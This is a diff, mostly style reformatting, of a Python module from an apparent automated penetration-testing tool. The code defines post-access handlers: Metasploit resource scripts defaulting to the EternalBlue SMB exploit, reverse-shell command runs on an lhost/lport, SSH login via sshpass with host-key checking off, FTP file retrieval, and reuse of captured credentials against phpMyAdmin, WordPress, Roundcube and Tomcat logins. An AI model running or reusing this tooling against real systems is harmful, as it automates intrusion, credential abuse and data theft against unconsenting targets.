@@ -17,6 +17,7 @@ Usage:
     handler = PostAccessHandler.for_session(session_record)
     result  = handler.execute(dispatcher, target, lhost, lport, cfg)
 """
+
 from __future__ import annotations
 
 import base64
@@ -25,7 +26,7 @@ import textwrap
 from abc import ABC, abstractmethod
 from dataclasses import dataclass
 from enum import Enum
-from typing import Optional, TYPE_CHECKING
+from typing import TYPE_CHECKING
 
 if TYPE_CHECKING:
     from hydrasight.services.dispatcher import Dispatcher
@@ -33,48 +34,51 @@ if TYPE_CHECKING:
 
 # ── access type ───────────────────────────────────────────────────────────────
 
+
 class AccessType(str, Enum):
     METERPRETER = "meterpreter"
-    SHELL       = "shell"
-    SSH         = "ssh"
-    FTP         = "ftp"
-    WEB_ADMIN   = "web_admin"
-    API_TOKEN   = "api_token"
-    UNKNOWN     = "unknown"
+    SHELL = "shell"
+    SSH = "ssh"
+    FTP = "ftp"
+    WEB_ADMIN = "web_admin"
+    API_TOKEN = "api_token"
+    UNKNOWN = "unknown"
 
 
 # ── result ────────────────────────────────────────────────────────────────────
+
 
 @dataclass
 class PostAccessResult:
     """Outcome of a post-access handler execution."""
 
-    access_type : AccessType
-    success     : bool
-    output      : str
-    hashes      : list[dict]        # [{username, lm, ntlm}]
-    credentials : list[dict]        # [{username, secret, kind}]
-    artifacts   : list[str]         # file paths, ssh keys, etc.
-    notes       : str               = ""
+    access_type: AccessType
+    success: bool
+    output: str
+    hashes: list[dict]  # [{username, lm, ntlm}]
+    credentials: list[dict]  # [{username, secret, kind}]
+    artifacts: list[str]  # file paths, ssh keys, etc.
+    notes: str = ""
 
     @classmethod
     def failure(
         cls,
-        access_type : AccessType,
-        reason      : str = "",
-    ) -> "PostAccessResult":
+        access_type: AccessType,
+        reason: str = "",
+    ) -> PostAccessResult:
         return cls(
-            access_type = access_type,
-            success     = False,
-            output      = "",
-            hashes      = [],
-            credentials = [],
-            artifacts   = [],
-            notes       = reason,
+            access_type=access_type,
+            success=False,
+            output="",
+            hashes=[],
+            credentials=[],
+            artifacts=[],
+            notes=reason,
         )
 
 
 # ── base handler ──────────────────────────────────────────────────────────────
+
 
 class BasePostAccessHandler(ABC):
     """Abstract post-access handler."""
@@ -83,20 +87,20 @@ class BasePostAccessHandler(ABC):
 
     def __init__(
         self,
-        log     : logging.Logger,
-        session : dict,
+        log: logging.Logger,
+        session: dict,
     ) -> None:
-        self.log     = log
+        self.log = log
         self.session = session
 
     @abstractmethod
     def execute(
         self,
-        dispatcher : "Dispatcher",
-        target     : str,
-        lhost      : str,
-        lport      : int,
-        cfg        : dict,
+        dispatcher: Dispatcher,
+        target: str,
+        lhost: str,
+        lport: int,
+        cfg: dict,
     ) -> PostAccessResult:
         """Run post-access commands and return structured results."""
         ...
@@ -118,6 +122,7 @@ class BasePostAccessHandler(ABC):
 
 # ── meterpreter handler ───────────────────────────────────────────────────────
 
+
 class MeterpreterHandler(BasePostAccessHandler):
     """
     Post-access via Metasploit meterpreter session.
@@ -130,18 +135,17 @@ class MeterpreterHandler(BasePostAccessHandler):
 
     def execute(
         self,
-        dispatcher : "Dispatcher",
-        target     : str,
-        lhost      : str,
-        lport      : int,
-        cfg        : dict,
+        dispatcher: Dispatcher,
+        target: str,
+        lhost: str,
+        lport: int,
+        cfg: dict,
     ) -> PostAccessResult:
-        payload    = self.session.get("payload", "")
+        payload = self.session.get("payload", "")
         is_windows = bool(payload and "windows" in payload.lower())
-        module     = self.session.get("module",
-                     "exploit/windows/smb/ms17_010_eternalblue")
-        rport      = int(self.session.get("rport", 445))
-        cmds       = self._default_commands(is_windows)
+        module = self.session.get("module", "exploit/windows/smb/ms17_010_eternalblue")
+        rport = int(self.session.get("rport", 445))
+        cmds = self._default_commands(is_windows)
 
         cmd_block: list[str] = []
         for c in cmds.split(";"):
@@ -151,9 +155,7 @@ class MeterpreterHandler(BasePostAccessHandler):
                 cmd_block.append("sleep 4")
 
         is_aux = module.startswith("auxiliary/")
-        payload_line = (
-            "" if (is_aux or not payload) else f"set PAYLOAD {payload}"
-        )
+        payload_line = "" if (is_aux or not payload) else f"set PAYLOAD {payload}"
         action_line = "run" if is_aux else "exploit -z"
 
         rc_content = textwrap.dedent(f"""\
@@ -189,22 +191,21 @@ class MeterpreterHandler(BasePostAccessHandler):
             )
         except Exception as exc:  # noqa: BLE001
             self.log.error("meterpreter handler error: %s", exc)
-            return PostAccessResult.failure(
-                self.access_type, f"dispatch error: {exc}"
-            )
+            return PostAccessResult.failure(self.access_type, f"dispatch error: {exc}")
 
         return PostAccessResult(
-            access_type = self.access_type,
-            success     = bool(output),
-            output      = output,
-            hashes      = [],      # caller (engine) parses from output
-            credentials = [],
-            artifacts   = [],
-            notes       = f"module={module} lport={lport}",
+            access_type=self.access_type,
+            success=bool(output),
+            output=output,
+            hashes=[],  # caller (engine) parses from output
+            credentials=[],
+            artifacts=[],
+            notes=f"module={module} lport={lport}",
         )
 
 
 # ── shell handler ─────────────────────────────────────────────────────────────
+
 
 class ShellHandler(BasePostAccessHandler):
     """
@@ -218,11 +219,11 @@ class ShellHandler(BasePostAccessHandler):
 
     def execute(
         self,
-        dispatcher : "Dispatcher",
-        target     : str,
-        lhost      : str,
-        lport      : int,
-        cfg        : dict,
+        dispatcher: Dispatcher,
+        target: str,
+        lhost: str,
+        lport: int,
+        cfg: dict,
     ) -> PostAccessResult:
         cmds = self._default_commands(is_windows=False)
 
@@ -257,27 +258,24 @@ class ShellHandler(BasePostAccessHandler):
 
         self.log.info("shell post-access handler lport %d", lport)
         try:
-            _, output, _ = dispatcher.dispatch(
-                {"tool": "run_command", "args": {"command": cmd}}
-            )
+            _, output, _ = dispatcher.dispatch({"tool": "run_command", "args": {"command": cmd}})
         except Exception as exc:  # noqa: BLE001
             self.log.error("shell handler error: %s", exc)
-            return PostAccessResult.failure(
-                self.access_type, f"dispatch error: {exc}"
-            )
+            return PostAccessResult.failure(self.access_type, f"dispatch error: {exc}")
 
         return PostAccessResult(
-            access_type = self.access_type,
-            success     = bool(output),
-            output      = output,
-            hashes      = [],
-            credentials = [],
-            artifacts   = [],
-            notes       = f"shell reverse lport={lport}",
+            access_type=self.access_type,
+            success=bool(output),
+            output=output,
+            hashes=[],
+            credentials=[],
+            artifacts=[],
+            notes=f"shell reverse lport={lport}",
         )
 
 
 # ── SSH handler (stub — Phase 4) ──────────────────────────────────────────────
+
 
 class SSHAccessHandler(BasePostAccessHandler):
     """
@@ -291,18 +289,16 @@ class SSHAccessHandler(BasePostAccessHandler):
 
     def execute(
         self,
-        dispatcher : "Dispatcher",
-        target     : str,
-        lhost      : str,
-        lport      : int,
-        cfg        : dict,
+        dispatcher: Dispatcher,
+        target: str,
+        lhost: str,
+        lport: int,
+        cfg: dict,
     ) -> PostAccessResult:
         username = self.session.get("username", "")
         password = self.session.get("password", "")
         if not (username and password):
-            return PostAccessResult.failure(
-                self.access_type, "no credentials in session record"
-            )
+            return PostAccessResult.failure(self.access_type, "no credentials in session record")
         cmds = self._default_commands(is_windows=False)
         cmd = (
             f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
@@ -311,25 +307,22 @@ class SSHAccessHandler(BasePostAccessHandler):
         )
         self.log.info("ssh post-access: %s@%s", username, target)
         try:
-            _, output, _ = dispatcher.dispatch(
-                {"tool": "run_command", "args": {"command": cmd}}
-            )
+            _, output, _ = dispatcher.dispatch({"tool": "run_command", "args": {"command": cmd}})
         except Exception as exc:  # noqa: BLE001
-            return PostAccessResult.failure(
-                self.access_type, f"ssh error: {exc}"
-            )
+            return PostAccessResult.failure(self.access_type, f"ssh error: {exc}")
         return PostAccessResult(
-            access_type = self.access_type,
-            success     = bool(output),
-            output      = output,
-            hashes      = [],
-            credentials = [],
-            artifacts   = [],
-            notes       = f"ssh {username}@{target}",
+            access_type=self.access_type,
+            success=bool(output),
+            output=output,
+            hashes=[],
+            credentials=[],
+            artifacts=[],
+            notes=f"ssh {username}@{target}",
         )
 
 
 # ── FTP access handler ────────────────────────────────────────────────────────
+
 
 class FTPAccessHandler(BasePostAccessHandler):
     """
@@ -354,24 +347,22 @@ class FTPAccessHandler(BasePostAccessHandler):
 
     def execute(
         self,
-        dispatcher : "Dispatcher",
-        target     : str,
-        lhost      : str,
-        lport      : int,
-        cfg        : dict,
+        dispatcher: Dispatcher,
+        target: str,
+        lhost: str,
+        lport: int,
+        cfg: dict,
     ) -> PostAccessResult:
         username = self.session.get("username", "")
         password = self.session.get("password", self.session.get("secret", ""))
-        rport    = int(self.session.get("rport", 21))
+        rport = int(self.session.get("rport", 21))
 
         if not (username and password):
-            return PostAccessResult.failure(
-                self.access_type, "no credentials in session record"
-            )
+            return PostAccessResult.failure(self.access_type, "no credentials in session record")
 
         self.log.info("ftp post-access: %s@%s:%d", username, target, rport)
         output_parts: list[str] = []
-        artifacts:    list[str] = []
+        artifacts: list[str] = []
 
         # ── step 1: list root directory ───────────────────────────────────
         list_cmd = (
@@ -386,9 +377,7 @@ class FTPAccessHandler(BasePostAccessHandler):
             if listing:
                 output_parts.append(f"=== FTP ROOT LISTING ===\n{listing}")
         except Exception as exc:  # noqa: BLE001
-            return PostAccessResult.failure(
-                self.access_type, f"ftp listing error: {exc}"
-            )
+            return PostAccessResult.failure(self.access_type, f"ftp listing error: {exc}")
 
         if not listing or "error" in listing.lower() or "failed" in listing.lower():
             return PostAccessResult.failure(
@@ -407,29 +396,25 @@ class FTPAccessHandler(BasePostAccessHandler):
                     {"tool": "run_command", "args": {"command": get_cmd}}
                 )
                 if content and "error" not in content.lower()[:50]:
-                    output_parts.append(
-                        f"=== {path} ===\n{content[:2000]}"
-                    )
+                    output_parts.append(f"=== {path} ===\n{content[:2000]}")
                     artifacts.append(path)
             except Exception:  # noqa: BLE001
-                pass   # file not accessible — silently skip
+                pass  # file not accessible — silently skip
 
         full_output = "\n\n".join(output_parts)
         return PostAccessResult(
-            access_type = self.access_type,
-            success     = bool(full_output),
-            output      = full_output,
-            hashes      = [],
-            credentials = [],
-            artifacts   = artifacts,
-            notes       = (
-                f"ftp {username}@{target}:{rport}  "
-                f"files retrieved: {len(artifacts)}"
-            ),
+            access_type=self.access_type,
+            success=bool(full_output),
+            output=full_output,
+            hashes=[],
+            credentials=[],
+            artifacts=artifacts,
+            notes=(f"ftp {username}@{target}:{rport}  files retrieved: {len(artifacts)}"),
         )
 
 
 # ── web admin handler ─────────────────────────────────────────────────────────
+
 
 class WebAdminHandler(BasePostAccessHandler):
     """
@@ -451,58 +436,54 @@ class WebAdminHandler(BasePostAccessHandler):
     # Common web login paths and their POST field names
     _PROFILES: list[dict] = [
         {
-            "path"       : "/phpmyadmin/index.php",
-            "user_field" : "pma_username",
-            "pass_field" : "pma_password",
+            "path": "/phpmyadmin/index.php",
+            "user_field": "pma_username",
+            "pass_field": "pma_password",
             "success_str": "phpMyAdmin",
-            "label"      : "phpMyAdmin",
+            "label": "phpMyAdmin",
         },
         {
-            "path"       : "/wp-login.php",
-            "user_field" : "log",
-            "pass_field" : "pwd",
+            "path": "/wp-login.php",
+            "user_field": "log",
+            "pass_field": "pwd",
             "success_str": "wp-admin",
-            "label"      : "WordPress",
+            "label": "WordPress",
         },
         {
-            "path"       : "/webmail/index.php",
-            "user_field" : "_user",
-            "pass_field" : "_pass",
+            "path": "/webmail/index.php",
+            "user_field": "_user",
+            "pass_field": "_pass",
             "success_str": "roundcube",
-            "label"      : "Roundcube",
+            "label": "Roundcube",
         },
         {
-            "path"       : "/manager/html",
-            "user_field" : None,    # HTTP basic auth
-            "pass_field" : None,
+            "path": "/manager/html",
+            "user_field": None,  # HTTP basic auth
+            "pass_field": None,
             "success_str": "tomcat",
-            "label"      : "Tomcat Manager",
+            "label": "Tomcat Manager",
         },
     ]
 
     def execute(
         self,
-        dispatcher : "Dispatcher",
-        target     : str,
-        lhost      : str,
-        lport      : int,
-        cfg        : dict,
+        dispatcher: Dispatcher,
+        target: str,
+        lhost: str,
+        lport: int,
+        cfg: dict,
     ) -> PostAccessResult:
-        username  = self.session.get("username", "")
-        password  = self.session.get("password", self.session.get("secret", ""))
-        rport     = int(self.session.get("rport", 80))
-        scheme    = "https" if rport == 443 else "http"
+        username = self.session.get("username", "")
+        password = self.session.get("password", self.session.get("secret", ""))
+        rport = int(self.session.get("rport", 80))
+        scheme = "https" if rport == 443 else "http"
 
         if not (username and password):
-            return PostAccessResult.failure(
-                self.access_type, "no credentials in session record"
-            )
+            return PostAccessResult.failure(self.access_type, "no credentials in session record")
 
-        self.log.info(
-            "web admin post-access: %s@%s:%d", username, target, rport
-        )
+        self.log.info("web admin post-access: %s@%s:%d", username, target, rport)
         output_parts: list[str] = []
-        successes:    list[str] = []
+        successes: list[str] = []
 
         for profile in self._PROFILES:
             url = f"{scheme}://{target}:{rport}{profile['path']}"
@@ -517,10 +498,7 @@ class WebAdminHandler(BasePostAccessHandler):
                 )
             else:
                 # POST form login
-                data = (
-                    f"{profile['user_field']}={username}"
-                    f"&{profile['pass_field']}={password}"
-                )
+                data = f"{profile['user_field']}={username}&{profile['pass_field']}={password}"
                 cmd = (
                     f"curl -s -L --connect-timeout 8 "
                     f"-c /tmp/hs_web_cookie.txt "
@@ -539,9 +517,8 @@ class WebAdminHandler(BasePostAccessHandler):
                 continue
 
             # Detect success
-            success = (
-                profile["success_str"].lower() in response.lower()
-                or (profile["user_field"] is None and response.strip() == "200")
+            success = profile["success_str"].lower() in response.lower() or (
+                profile["user_field"] is None and response.strip() == "200"
             )
 
             if success:
@@ -553,28 +530,25 @@ class WebAdminHandler(BasePostAccessHandler):
                     f"Response sample: {response[:500]}"
                 )
             else:
-                output_parts.append(
-                    f"=== {profile['label']} — no access at {url} ==="
-                )
+                output_parts.append(f"=== {profile['label']} — no access at {url} ===")
 
         # Cleanup cookie jar
         try:
-            dispatcher.dispatch({
-                "tool": "run_command",
-                "args": {"command": "rm -f /tmp/hs_web_cookie.txt"}
-            })
+            dispatcher.dispatch(
+                {"tool": "run_command", "args": {"command": "rm -f /tmp/hs_web_cookie.txt"}}
+            )
         except Exception:  # noqa: BLE001
             pass
 
         full_output = "\n\n".join(output_parts)
         return PostAccessResult(
-            access_type = self.access_type,
-            success     = bool(successes),
-            output      = full_output,
-            hashes      = [],
-            credentials = [],
-            artifacts   = successes,
-            notes       = (
+            access_type=self.access_type,
+            success=bool(successes),
+            output=full_output,
+            hashes=[],
+            credentials=[],
+            artifacts=successes,
+            notes=(
                 f"web admin: {len(successes)} access point(s) confirmed"
                 if successes
                 else "web admin: no access gained"
@@ -584,6 +558,7 @@ class WebAdminHandler(BasePostAccessHandler):
 
 # ── factory ───────────────────────────────────────────────────────────────────
 
+
 class PostAccessHandler:
     """
     Factory — select the correct handler from a session record or access type.
@@ -591,18 +566,18 @@ class PostAccessHandler:
 
     _REGISTRY: dict[AccessType, type[BasePostAccessHandler]] = {
         AccessType.METERPRETER: MeterpreterHandler,
-        AccessType.SHELL      : ShellHandler,
-        AccessType.SSH        : SSHAccessHandler,
-        AccessType.FTP        : FTPAccessHandler,
-        AccessType.WEB_ADMIN  : WebAdminHandler,
+        AccessType.SHELL: ShellHandler,
+        AccessType.SSH: SSHAccessHandler,
+        AccessType.FTP: FTPAccessHandler,
+        AccessType.WEB_ADMIN: WebAdminHandler,
     }
 
     @classmethod
     def for_session(
         cls,
-        session    : dict,
-        log        : logging.Logger,
-        access_type: Optional[AccessType] = None,
+        session: dict,
+        log: logging.Logger,
+        access_type: AccessType | None = None,
     ) -> BasePostAccessHandler:
         """
         Return the appropriate handler for a session record.
@@ -635,8 +610,8 @@ class PostAccessHandler:
     @classmethod
     def register(
         cls,
-        access_type : AccessType,
-        handler_cls : type[BasePostAccessHandler],
+        access_type: AccessType,
+        handler_cls: type[BasePostAccessHandler],
     ) -> None:
         """Register a new handler type (extension point for future phases)."""
         cls._REGISTRY[access_type] = handler_cls
